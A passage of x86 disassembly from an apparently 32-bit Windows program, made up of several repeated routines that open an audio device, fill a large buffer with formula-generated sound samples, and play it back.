  4041de:	89 c2                	mov    %eax,%edx
  4041e0:	89 c8                	mov    %ecx,%eax
  4041e2:	0f af c2             	imul   %edx,%eax
  4041e5:	83 e0 84             	and    $0xffffff84,%eax
  4041e8:	31 d8                	xor    %ebx,%eax
  4041ea:	89 c1                	mov    %eax,%ecx
  4041ec:	8d 95 26 b3 f5 ff    	lea    -0xa4cda(%ebp),%edx
  4041f2:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4041f5:	01 d0                	add    %edx,%eax
  4041f7:	88 08                	mov    %cl,(%eax)
  4041f9:	83 45 f4 01          	addl   $0x1,-0xc(%ebp)
  4041fd:	e9 68 ff ff ff       	jmp    0x40416a
  404202:	8d 85 06 b3 f5 ff    	lea    -0xa4cfa(%ebp),%eax
  404208:	b9 20 00 00 00       	mov    $0x20,%ecx
  40420d:	bb 00 00 00 00       	mov    $0x0,%ebx
  404212:	89 18                	mov    %ebx,(%eax)
  404214:	89 5c 08 fc          	mov    %ebx,-0x4(%eax,%ecx,1)
  404218:	8d 50 04             	lea    0x4(%eax),%edx
  40421b:	83 e2 fc             	and    $0xfffffffc,%edx
  40421e:	29 d0                	sub    %edx,%eax
  404220:	01 c1                	add    %eax,%ecx
  404222:	83 e1 fc             	and    $0xfffffffc,%ecx
  404225:	83 e1 fc             	and    $0xfffffffc,%ecx
  404228:	b8 00 00 00 00       	mov    $0x0,%eax
  40422d:	89 1c 02             	mov    %ebx,(%edx,%eax,1)
  404230:	83 c0 04             	add    $0x4,%eax
  404233:	39 c8                	cmp    %ecx,%eax
  404235:	72 f6                	jb     0x40422d
  404237:	01 c2                	add    %eax,%edx
  404239:	c7 85 0a b3 f5 ff b8 	movl   $0xa4cb8,-0xa4cf6(%ebp)
  404240:	4c 0a 00 
  404243:	8d 85 26 b3 f5 ff    	lea    -0xa4cda(%ebp),%eax
  404249:	89 85 06 b3 f5 ff    	mov    %eax,-0xa4cfa(%ebp)
  40424f:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404252:	c7 44 24 08 20 00 00 	movl   $0x20,0x8(%esp)
  404259:	00 
  40425a:	8d 95 06 b3 f5 ff    	lea    -0xa4cfa(%ebp),%edx
  404260:	89 54 24 04          	mov    %edx,0x4(%esp)
  404264:	89 04 24             	mov    %eax,(%esp)
  404267:	a1 14 a3 40 00       	mov    0x40a314,%eax
  40426c:	ff d0                	call   *%eax
  40426e:	83 ec 0c             	sub    $0xc,%esp
  404271:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404274:	c7 44 24 08 20 00 00 	movl   $0x20,0x8(%esp)
  40427b:	00 
  40427c:	8d 95 06 b3 f5 ff    	lea    -0xa4cfa(%ebp),%edx
  404282:	89 54 24 04          	mov    %edx,0x4(%esp)
  404286:	89 04 24             	mov    %eax,(%esp)
  404289:	a1 1c a3 40 00       	mov    0x40a31c,%eax
  40428e:	ff d0                	call   *%eax
  404290:	83 ec 0c             	sub    $0xc,%esp
  404293:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404296:	c7 44 24 08 20 00 00 	movl   $0x20,0x8(%esp)
  40429d:	00 
  40429e:	8d 95 06 b3 f5 ff    	lea    -0xa4cfa(%ebp),%edx
  4042a4:	89 54 24 04          	mov    %edx,0x4(%esp)
  4042a8:	89 04 24             	mov    %eax,(%esp)
  4042ab:	a1 18 a3 40 00       	mov    0x40a318,%eax
  4042b0:	ff d0                	call   *%eax
  4042b2:	83 ec 0c             	sub    $0xc,%esp
  4042b5:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4042b8:	89 04 24             	mov    %eax,(%esp)
  4042bb:	a1 0c a3 40 00       	mov    0x40a30c,%eax
  4042c0:	ff d0                	call   *%eax
  4042c2:	83 ec 04             	sub    $0x4,%esp
  4042c5:	90                   	nop
  4042c6:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  4042c9:	c9                   	leave
  4042ca:	c3                   	ret
  4042cb:	55                   	push   %ebp
  4042cc:	89 e5                	mov    %esp,%ebp
  4042ce:	56                   	push   %esi
  4042cf:	53                   	push   %ebx
  4042d0:	b8 60 a6 0e 00       	mov    $0xea660,%eax
  4042d5:	e8 f6 28 00 00       	call   0x406bd0
  4042da:	29 c4                	sub    %eax,%esp
  4042dc:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  4042e3:	66 c7 45 de 01 00    	movw   $0x1,-0x22(%ebp)
  4042e9:	66 c7 45 e0 01 00    	movw   $0x1,-0x20(%ebp)
  4042ef:	c7 45 e2 00 7d 00 00 	movl   $0x7d00,-0x1e(%ebp)
  4042f6:	c7 45 e6 00 7d 00 00 	movl   $0x7d00,-0x1a(%ebp)
  4042fd:	66 c7 45 ea 01 00    	movw   $0x1,-0x16(%ebp)
  404303:	66 c7 45 ec 08 00    	movw   $0x8,-0x14(%ebp)
  404309:	66 c7 45 ee 00 00    	movw   $0x0,-0x12(%ebp)
  40430f:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  404316:	00 
  404317:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  40431e:	00 
  40431f:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  404326:	00 
  404327:	8d 45 de             	lea    -0x22(%ebp),%eax
  40432a:	89 44 24 08          	mov    %eax,0x8(%esp)
  40432e:	c7 44 24 04 ff ff ff 	movl   $0xffffffff,0x4(%esp)
  404335:	ff 
  404336:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404339:	89 04 24             	mov    %eax,(%esp)
  40433c:	a1 10 a3 40 00       	mov    0x40a310,%eax
  404341:	ff d0                	call   *%eax
  404343:	83 ec 18             	sub    $0x18,%esp
  404346:	c7 85 de 59 f1 ff 00 	movl   $0x0,-0xea622(%ebp)
  40434d:	00 00 00 
  404350:	8d 85 e2 59 f1 ff    	lea    -0xea61e(%ebp),%eax
  404356:	ba fc a5 0e 00       	mov    $0xea5fc,%edx
  40435b:	89 54 24 08          	mov    %edx,0x8(%esp)
  40435f:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  404366:	00 
  404367:	89 04 24             	mov    %eax,(%esp)
  40436a:	e8 d9 2a 00 00       	call   0x406e48
  40436f:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  404376:	81 7d f4 ff a5 0e 00 	cmpl   $0xea5ff,-0xc(%ebp)
  40437d:	77 56                	ja     0x4043d5
  40437f:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404382:	d1 e8                	shr    $1,%eax
  404384:	89 c3                	mov    %eax,%ebx
  404386:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404389:	83 c0 01             	add    $0x1,%eax
  40438c:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40438f:	89 d6                	mov    %edx,%esi
  404391:	89 c1                	mov    %eax,%ecx
  404393:	d3 ee                	shr    %cl,%esi
  404395:	8b 55 f4             	mov    -0xc(%ebp),%edx
  404398:	89 d0                	mov    %edx,%eax
  40439a:	c1 e0 02             	shl    $0x2,%eax
  40439d:	01 d0                	add    %edx,%eax
  40439f:	01 c0                	add    %eax,%eax
  4043a1:	01 d0                	add    %edx,%eax
  4043a3:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4043a6:	89 c1                	mov    %eax,%ecx
  4043a8:	d3 ea                	shr    %cl,%edx
  4043aa:	89 d0                	mov    %edx,%eax
  4043ac:	c1 e8 06             	shr    $0x6,%eax
  4043af:	0f af c6             	imul   %esi,%eax
  4043b2:	09 d8                	or     %ebx,%eax
  4043b4:	89 c1                	mov    %eax,%ecx
  4043b6:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4043b9:	89 c2                	mov    %eax,%edx
  4043bb:	89 c8                	mov    %ecx,%eax
  4043bd:	0f af c2             	imul   %edx,%eax
  4043c0:	89 c1                	mov    %eax,%ecx
  4043c2:	8d 95 de 59 f1 ff    	lea    -0xea622(%ebp),%edx
  4043c8:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4043cb:	01 d0                	add    %edx,%eax
  4043cd:	88 08                	mov    %cl,(%eax)
  4043cf:	83 45 f4 01          	addl   $0x1,-0xc(%ebp)
  4043d3:	eb a1                	jmp    0x404376
  4043d5:	8d 85 be 59 f1 ff    	lea    -0xea642(%ebp),%eax
  4043db:	b9 20 00 00 00       	mov    $0x20,%ecx
  4043e0:	bb 00 00 00 00       	mov    $0x0,%ebx
  4043e5:	89 18                	mov    %ebx,(%eax)
  4043e7:	89 5c 08 fc          	mov    %ebx,-0x4(%eax,%ecx,1)
  4043eb:	8d 50 04             	lea    0x4(%eax),%edx
  4043ee:	83 e2 fc             	and    $0xfffffffc,%edx
  4043f1:	29 d0                	sub    %edx,%eax
  4043f3:	01 c1                	add    %eax,%ecx
  4043f5:	83 e1 fc             	and    $0xfffffffc,%ecx
  4043f8:	83 e1 fc             	and    $0xfffffffc,%ecx
  4043fb:	b8 00 00 00 00       	mov    $0x0,%eax
  404400:	89 1c 02             	mov    %ebx,(%edx,%eax,1)
  404403:	83 c0 04             	add    $0x4,%eax
  404406:	39 c8                	cmp    %ecx,%eax
  404408:	72 f6                	jb     0x404400
  40440a:	01 c2                	add    %eax,%edx
  40440c:	c7 85 c2 59 f1 ff 00 	movl   $0xea600,-0xea63e(%ebp)
  404413:	a6 0e 00 
  404416:	8d 85 de 59 f1 ff    	lea    -0xea622(%ebp),%eax
  40441c:	89 85 be 59 f1 ff    	mov    %eax,-0xea642(%ebp)
  404422:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404425:	c7 44 24 08 20 00 00 	movl   $0x20,0x8(%esp)
  40442c:	00 
  40442d:	8d 95 be 59 f1 ff    	lea    -0xea642(%ebp),%edx
  404433:	89 54 24 04          	mov    %edx,0x4(%esp)
  404437:	89 04 24             	mov    %eax,(%esp)
  40443a:	a1 14 a3 40 00       	mov    0x40a314,%eax
  40443f:	ff d0                	call   *%eax
  404441:	83 ec 0c             	sub    $0xc,%esp
  404444:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404447:	c7 44 24 08 20 00 00 	movl   $0x20,0x8(%esp)
  40444e:	00 
  40444f:	8d 95 be 59 f1 ff    	lea    -0xea642(%ebp),%edx
  404455:	89 54 24 04          	mov    %edx,0x4(%esp)
  404459:	89 04 24             	mov    %eax,(%esp)
  40445c:	a1 1c a3 40 00       	mov    0x40a31c,%eax
  404461:	ff d0                	call   *%eax
  404463:	83 ec 0c             	sub    $0xc,%esp
  404466:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404469:	c7 44 24 08 20 00 00 	movl   $0x20,0x8(%esp)
  404470:	00 
  404471:	8d 95 be 59 f1 ff    	lea    -0xea642(%ebp),%edx
  404477:	89 54 24 04          	mov    %edx,0x4(%esp)
  40447b:	89 04 24             	mov    %eax,(%esp)
  40447e:	a1 18 a3 40 00       	mov    0x40a318,%eax
  404483:	ff d0                	call   *%eax
  404485:	83 ec 0c             	sub    $0xc,%esp
  404488:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40448b:	89 04 24             	mov    %eax,(%esp)
  40448e:	a1 0c a3 40 00       	mov    0x40a30c,%eax
  404493:	ff d0                	call   *%eax
  404495:	83 ec 04             	sub    $0x4,%esp
  404498:	90                   	nop
  404499:	8d 65 f8             	lea    -0x8(%ebp),%esp
  40449c:	5b                   	pop    %ebx
  40449d:	5e                   	pop    %esi
  40449e:	5d                   	pop    %ebp
  40449f:	c3                   	ret
  4044a0:	55                   	push   %ebp
  4044a1:	89 e5                	mov    %esp,%ebp
  4044a3:	57                   	push   %edi
  4044a4:	56                   	push   %esi
  4044a5:	53                   	push   %ebx
  4044a6:	b8 7c a6 0e 00       	mov    $0xea67c,%eax
  4044ab:	e8 20 27 00 00       	call   0x406bd0
  4044b0:	29 c4                	sub    %eax,%esp
  4044b2:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%ebp)
  4044b9:	66 c7 45 ce 01 00    	movw   $0x1,-0x32(%ebp)
  4044bf:	66 c7 45 d0 01 00    	movw   $0x1,-0x30(%ebp)
  4044c5:	c7 45 d2 00 7d 00 00 	movl   $0x7d00,-0x2e(%ebp)
  4044cc:	c7 45 d6 00 7d 00 00 	movl   $0x7d00,-0x2a(%ebp)
  4044d3:	66 c7 45 da 01 00    	movw   $0x1,-0x26(%ebp)
  4044d9:	66 c7 45 dc 08 00    	movw   $0x8,-0x24(%ebp)
  4044df:	66 c7 45 de 00 00    	movw   $0x0,-0x22(%ebp)
  4044e5:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  4044ec:	00 
  4044ed:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  4044f4:	00 
  4044f5:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  4044fc:	00 
  4044fd:	8d 45 ce             	lea    -0x32(%ebp),%eax
  404500:	89 44 24 08          	mov    %eax,0x8(%esp)
  404504:	c7 44 24 04 ff ff ff 	movl   $0xffffffff,0x4(%esp)
  40450b:	ff 
  40450c:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40450f:	89 04 24             	mov    %eax,(%esp)
  404512:	a1 10 a3 40 00       	mov    0x40a310,%eax
  404517:	ff d0                	call   *%eax
  404519:	83 ec 18             	sub    $0x18,%esp
  40451c:	c7 85 ce 59 f1 ff 00 	movl   $0x0,-0xea632(%ebp)
  404523:	00 00 00 
  404526:	8d 85 d2 59 f1 ff    	lea    -0xea62e(%ebp),%eax
  40452c:	ba fc a5 0e 00       	mov    $0xea5fc,%edx
  404531:	89 54 24 08          	mov    %edx,0x8(%esp)
  404535:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  40453c:	00 
  40453d:	89 04 24             	mov    %eax,(%esp)
  404540:	e8 03 29 00 00       	call   0x406e48
  404545:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%ebp)
  40454c:	81 7d e4 ff a5 0e 00 	cmpl   $0xea5ff,-0x1c(%ebp)
  404553:	0f 87 8e 00 00 00    	ja     0x4045e7
  404559:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40455c:	c1 e8 02             	shr    $0x2,%eax
  40455f:	88 85 a7 59 f1 ff    	mov    %al,-0xea659(%ebp)
  404565:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  404568:	ba cd cc cc cc       	mov    $0xcccccccd,%edx
  40456d:	f7 e2                	mul    %edx
  40456f:	c1 ea 02             	shr    $0x2,%edx
  404572:	89 d0                	mov    %edx,%eax
  404574:	89 c3                	mov    %eax,%ebx
  404576:	c1 eb 05             	shr    $0x5,%ebx
  404579:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40457c:	ba cd cc cc cc       	mov    $0xcccccccd,%edx
  404581:	f7 e2                	mul    %edx
  404583:	c1 ea 02             	shr    $0x2,%edx
  404586:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  404589:	c1 e8 02             	shr    $0x2,%eax
  40458c:	83 c0 01             	add    $0x1,%eax
  40458f:	89 d6                	mov    %edx,%esi
  404591:	89 c1                	mov    %eax,%ecx
  404593:	d3 ee                	shr    %cl,%esi
  404595:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  404598:	ba cd cc cc cc       	mov    $0xcccccccd,%edx
  40459d:	f7 e2                	mul    %edx
  40459f:	89 d7                	mov    %edx,%edi
  4045a1:	c1 ef 02             	shr    $0x2,%edi
  4045a4:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  4045a7:	89 d0                	mov    %edx,%eax
  4045a9:	c1 e0 02             	shl    $0x2,%eax
  4045ac:	01 d0                	add    %edx,%eax
  4045ae:	01 c0                	add    %eax,%eax
  4045b0:	01 d0                	add    %edx,%eax
  4045b2:	c1 e8 02             	shr    $0x2,%eax
  4045b5:	89 c1                	mov    %eax,%ecx
  4045b7:	d3 ef                	shr    %cl,%edi
  4045b9:	89 f8                	mov    %edi,%eax
  4045bb:	c1 e8 06             	shr    $0x6,%eax
  4045be:	0f af c6             	imul   %esi,%eax
  4045c1:	09 d8                	or     %ebx,%eax
  4045c3:	89 c2                	mov    %eax,%edx
  4045c5:	0f b6 85 a7 59 f1 ff 	movzbl -0xea659(%ebp),%eax
  4045cc:	0f af c2             	imul   %edx,%eax
  4045cf:	89 c1                	mov    %eax,%ecx
  4045d1:	8d 95 ce 59 f1 ff    	lea    -0xea632(%ebp),%edx
  4045d7:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4045da:	01 d0                	add    %edx,%eax
  4045dc:	88 08                	mov    %cl,(%eax)
  4045de:	83 45 e4 01          	addl   $0x1,-0x1c(%ebp)
  4045e2:	e9 65 ff ff ff       	jmp    0x40454c
  4045e7:	8d 85 ae 59 f1 ff    	lea    -0xea652(%ebp),%eax
  4045ed:	b9 20 00 00 00       	mov    $0x20,%ecx
  4045f2:	bb 00 00 00 00       	mov    $0x0,%ebx
  4045f7:	89 18                	mov    %ebx,(%eax)
  4045f9:	89 5c 08 fc          	mov    %ebx,-0x4(%eax,%ecx,1)
  4045fd:	8d 50 04             	lea    0x4(%eax),%edx
  404600:	83 e2 fc             	and    $0xfffffffc,%edx
  404603:	29 d0                	sub    %edx,%eax
  404605:	01 c1                	add    %eax,%ecx
  404607:	83 e1 fc             	and    $0xfffffffc,%ecx
  40460a:	83 e1 fc             	and    $0xfffffffc,%ecx
  40460d:	b8 00 00 00 00       	mov    $0x0,%eax
  404612:	89 1c 02             	mov    %ebx,(%edx,%eax,1)
  404615:	83 c0 04             	add    $0x4,%eax
  404618:	39 c8                	cmp    %ecx,%eax
  40461a:	72 f6                	jb     0x404612
  40461c:	01 c2                	add    %eax,%edx
  40461e:	c7 85 b2 59 f1 ff 00 	movl   $0xea600,-0xea64e(%ebp)
  404625:	a6 0e 00 
  404628:	8d 85 ce 59 f1 ff    	lea    -0xea632(%ebp),%eax
  40462e:	89 85 ae 59 f1 ff    	mov    %eax,-0xea652(%ebp)
  404634:	8b 45 e0             	mov    -0x20(%ebp),%eax
  404637:	c7 44 24 08 20 00 00 	movl   $0x20,0x8(%esp)
  40463e:	00 
  40463f:	8d 95 ae 59 f1 ff    	lea    -0xea652(%ebp),%edx
  404645:	89 54 24 04          	mov    %edx,0x4(%esp)
  404649:	89 04 24             	mov    %eax,(%esp)
  40464c:	a1 14 a3 40 00       	mov    0x40a314,%eax
  404651:	ff d0                	call   *%eax
  404653:	83 ec 0c             	sub    $0xc,%esp
  404656:	8b 45 e0             	mov    -0x20(%ebp),%eax
  404659:	c7 44 24 08 20 00 00 	movl   $0x20,0x8(%esp)
  404660:	00 
  404661:	8d 95 ae 59 f1 ff    	lea    -0xea652(%ebp),%edx
  404667:	89 54 24 04          	mov    %edx,0x4(%esp)
  40466b:	89 04 24             	mov    %eax,(%esp)
  40466e:	a1 1c a3 40 00       	mov    0x40a31c,%eax
  404673:	ff d0                	call   *%eax
  404675:	83 ec 0c             	sub    $0xc,%esp
  404678:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40467b:	c7 44 24 08 20 00 00 	movl   $0x20,0x8(%esp)
  404682:	00 
  404683:	8d 95 ae 59 f1 ff    	lea    -0xea652(%ebp),%edx
  404689:	89 54 24 04          	mov    %edx,0x4(%esp)
  40468d:	89 04 24             	mov    %eax,(%esp)
  404690:	a1 18 a3 40 00       	mov    0x40a318,%eax
  404695:	ff d0                	call   *%eax
  404697:	83 ec 0c             	sub    $0xc,%esp
  40469a:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40469d:	89 04 24             	mov    %eax,(%esp)
  4046a0:	a1 0c a3 40 00       	mov    0x40a30c,%eax
  4046a5:	ff d0                	call   *%eax
  4046a7:	83 ec 04             	sub    $0x4,%esp
  4046aa:	90                   	nop
  4046ab:	8d 65 f4             	lea    -0xc(%ebp),%esp
  4046ae:	5b                   	pop    %ebx
  4046af:	5e                   	pop    %esi
  4046b0:	5f                   	pop    %edi
  4046b1:	5d                   	pop    %ebp
  4046b2:	c3                   	ret
  4046b3:	55                   	push   %ebp
  4046b4:	89 e5                	mov    %esp,%ebp
  4046b6:	53                   	push   %ebx
  4046b7:	b8 64 a6 0e 00       	mov    $0xea664,%eax
  4046bc:	e8 0f 25 00 00       	call   0x406bd0
  4046c1:	29 c4                	sub    %eax,%esp
  4046c3:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  4046ca:	66 c7 45 de 01 00    	movw   $0x1,-0x22(%ebp)
  4046d0:	66 c7 45 e0 01 00    	movw   $0x1,-0x20(%ebp)
  4046d6:	c7 45 e2 00 7d 00 00 	movl   $0x7d00,-0x1e(%ebp)
  4046dd:	c7 45 e6 00 7d 00 00 	movl   $0x7d00,-0x1a(%ebp)
  4046e4:	66 c7 45 ea 01 00    	movw   $0x1,-0x16(%ebp)
  4046ea:	66 c7 45 ec 08 00    	movw   $0x8,-0x14(%ebp)
  4046f0:	66 c7 45 ee 00 00    	movw   $0x0,-0x12(%ebp)
  4046f6:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  4046fd:	00 
  4046fe:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  404705:	00 
  404706:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  40470d:	00 
  40470e:	8d 45 de             	lea    -0x22(%ebp),%eax
  404711:	89 44 24 08          	mov    %eax,0x8(%esp)
  404715:	c7 44 24 04 ff ff ff 	movl   $0xffffffff,0x4(%esp)
  40471c:	ff 
  40471d:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404720:	89 04 24             	mov    %eax,(%esp)
  404723:	a1 10 a3 40 00       	mov    0x40a310,%eax
  404728:	ff d0                	call   *%eax
  40472a:	83 ec 18             	sub    $0x18,%esp
  40472d:	c7 85 de 59 f1 ff 00 	movl   $0x0,-0xea622(%ebp)
  404734:	00 00 00 
  404737:	8d 85 e2 59 f1 ff    	lea    -0xea61e(%ebp),%eax
  40473d:	ba fc a5 0e 00       	mov    $0xea5fc,%edx
  404742:	89 54 24 08          	mov    %edx,0x8(%esp)
  404746:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  40474d:	00 
  40474e:	89 04 24             	mov    %eax,(%esp)
  404751:	e8 f2 26 00 00       	call   0x406e48
  404756:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  40475d:	81 7d f4 ff a5 0e 00 	cmpl   $0xea5ff,-0xc(%ebp)
  404764:	0f 87 81 00 00 00    	ja     0x4047eb
  40476a:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40476d:	25 00 40 00 00       	and    $0x4000,%eax
  404772:	85 c0                	test   %eax,%eax
  404774:	74 08                	je     0x40477e
  404776:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404779:	c1 e8 06             	shr    $0x6,%eax
  40477c:	eb 0a                	jmp    0x404788
  40477e:	8b 55 f4             	mov    -0xc(%ebp),%edx
  404781:	89 d0                	mov    %edx,%eax
  404783:	c1 e0 02             	shl    $0x2,%eax
  404786:	01 d0                	add    %edx,%eax
  404788:	0f af 45 f4          	imul   -0xc(%ebp),%eax
  40478c:	89 c2                	mov    %eax,%edx
  40478e:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404791:	25 00 08 00 00       	and    $0x800,%eax
  404796:	85 c0                	test   %eax,%eax
  404798:	74 08                	je     0x4047a2
  40479a:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40479d:	83 c0 07             	add    $0x7,%eax
  4047a0:	eb 06                	jmp    0x4047a8
  4047a2:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4047a5:	83 e0 0e             	and    $0xe,%eax
  4047a8:	8b 5d f4             	mov    -0xc(%ebp),%ebx
  4047ab:	89 c1                	mov    %eax,%ecx
  4047ad:	d3 eb                	shr    %cl,%ebx
  4047af:	89 d8                	mov    %ebx,%eax
  4047b1:	83 e0 03             	and    $0x3,%eax
  4047b4:	83 c0 03             	add    $0x3,%eax
  4047b7:	0f af d0             	imul   %eax,%edx
  4047ba:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4047bd:	c1 e8 09             	shr    $0x9,%eax
  4047c0:	83 e0 03             	and    $0x3,%eax
  4047c3:	89 c1                	mov    %eax,%ecx
  4047c5:	d3 ea                	shr    %cl,%edx
  4047c7:	89 d0                	mov    %edx,%eax
  4047c9:	89 c2                	mov    %eax,%edx
  4047cb:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4047ce:	c1 e8 02             	shr    $0x2,%eax
  4047d1:	09 d0                	or     %edx,%eax
  4047d3:	89 c1                	mov    %eax,%ecx
  4047d5:	8d 95 de 59 f1 ff    	lea    -0xea622(%ebp),%edx
  4047db:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4047de:	01 d0                	add    %edx,%eax
  4047e0:	88 08                	mov    %cl,(%eax)
  4047e2:	83 45 f4 01          	addl   $0x1,-0xc(%ebp)
  4047e6:	e9 72 ff ff ff       	jmp    0x40475d
  4047eb:	8d 85 be 59 f1 ff    	lea    -0xea642(%ebp),%eax
  4047f1:	b9 20 00 00 00       	mov    $0x20,%ecx
  4047f6:	bb 00 00 00 00       	mov    $0x0,%ebx
  4047fb:	89 18                	mov    %ebx,(%eax)
  4047fd:	89 5c 08 fc          	mov    %ebx,-0x4(%eax,%ecx,1)
  404801:	8d 50 04             	lea    0x4(%eax),%edx
  404804:	83 e2 fc             	and    $0xfffffffc,%edx
  404807:	29 d0                	sub    %edx,%eax
  404809:	01 c1                	add    %eax,%ecx
  40480b:	83 e1 fc             	and    $0xfffffffc,%ecx
  40480e:	83 e1 fc             	and    $0xfffffffc,%ecx
  404811:	b8 00 00 00 00       	mov    $0x0,%eax
  404816:	89 1c 02             	mov    %ebx,(%edx,%eax,1)
  404819:	83 c0 04             	add    $0x4,%eax
  40481c:	39 c8                	cmp    %ecx,%eax
  40481e:	72 f6                	jb     0x404816
  404820:	01 c2                	add    %eax,%edx
  404822:	c7 85 c2 59 f1 ff 00 	movl   $0xea600,-0xea63e(%ebp)
  404829:	a6 0e 00 
  40482c:	8d 85 de 59 f1 ff    	lea    -0xea622(%ebp),%eax
  404832:	89 85 be 59 f1 ff    	mov    %eax,-0xea642(%ebp)
  404838:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40483b:	c7 44 24 08 20 00 00 	movl   $0x20,0x8(%esp)
  404842:	00 
  404843:	8d 95 be 59 f1 ff    	lea    -0xea642(%ebp),%edx
  404849:	89 54 24 04          	mov    %edx,0x4(%esp)
  40484d:	89 04 24             	mov    %eax,(%esp)
  404850:	a1 14 a3 40 00       	mov    0x40a314,%eax
  404855:	ff d0                	call   *%eax
  404857:	83 ec 0c             	sub    $0xc,%esp
  40485a:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40485d:	c7 44 24 08 20 00 00 	movl   $0x20,0x8(%esp)
  404864:	00 
  404865:	8d 95 be 59 f1 ff    	lea    -0xea642(%ebp),%edx
  40486b:	89 54 24 04          	mov    %edx,0x4(%esp)
  40486f:	89 04 24             	mov    %eax,(%esp)
  404872:	a1 1c a3 40 00       	mov    0x40a31c,%eax
  404877:	ff d0                	call   *%eax
  404879:	83 ec 0c             	sub    $0xc,%esp
  40487c:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40487f:	c7 44 24 08 20 00 00 	movl   $0x20,0x8(%esp)
  404886:	00 
  404887:	8d 95 be 59 f1 ff    	lea    -0xea642(%ebp),%edx
  40488d:	89 54 24 04          	mov    %edx,0x4(%esp)
  404891:	89 04 24             	mov    %eax,(%esp)
  404894:	a1 18 a3 40 00       	mov    0x40a318,%eax
  404899:	ff d0                	call   *%eax
  40489b:	83 ec 0c             	sub    $0xc,%esp
  40489e:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4048a1:	89 04 24             	mov    %eax,(%esp)
  4048a4:	a1 0c a3 40 00       	mov    0x40a30c,%eax
  4048a9:	ff d0                	call   *%eax
  4048ab:	83 ec 04             	sub    $0x4,%esp
  4048ae:	90                   	nop
  4048af:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  4048b2:	c9                   	leave
  4048b3:	c3                   	ret
  4048b4:	55                   	push   %ebp
  4048b5:	89 e5                	mov    %esp,%ebp
  4048b7:	53                   	push   %ebx
  4048b8:	b8 64 a6 0e 00       	mov    $0xea664,%eax
  4048bd:	e8 0e 23 00 00       	call   0x406bd0
  4048c2:	29 c4                	sub    %eax,%esp
  4048c4:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  4048cb:	66 c7 45 de 01 00    	movw   $0x1,-0x22(%ebp)
  4048d1:	66 c7 45 e0 01 00    	movw   $0x1,-0x20(%ebp)
  4048d7:	c7 45 e2 00 7d 00 00 	movl   $0x7d00,-0x1e(%ebp)
  4048de:	c7 45 e6 00 7d 00 00 	movl   $0x7d00,-0x1a(%ebp)
  4048e5:	66 c7 45 ea 01 00    	movw   $0x1,-0x16(%ebp)
  4048eb:	66 c7 45 ec 08 00    	movw   $0x8,-0x14(%ebp)
  4048f1:	66 c7 45 ee 00 00    	movw   $0x0,-0x12(%ebp)
  4048f7:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  4048fe:	00 
  4048ff:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  404906:	00 
  404907:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  40490e:	00 
  40490f:	8d 45 de             	lea    -0x22(%ebp),%eax
  404912:	89 44 24 08          	mov    %eax,0x8(%esp)
  404916:	c7 44 24 04 ff ff ff 	movl   $0xffffffff,0x4(%esp)
  40491d:	ff 
  40491e:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404921:	89 04 24             	mov    %eax,(%esp)
  404924:	a1 10 a3 40 00       	mov    0x40a310,%eax
  404929:	ff d0                	call   *%eax
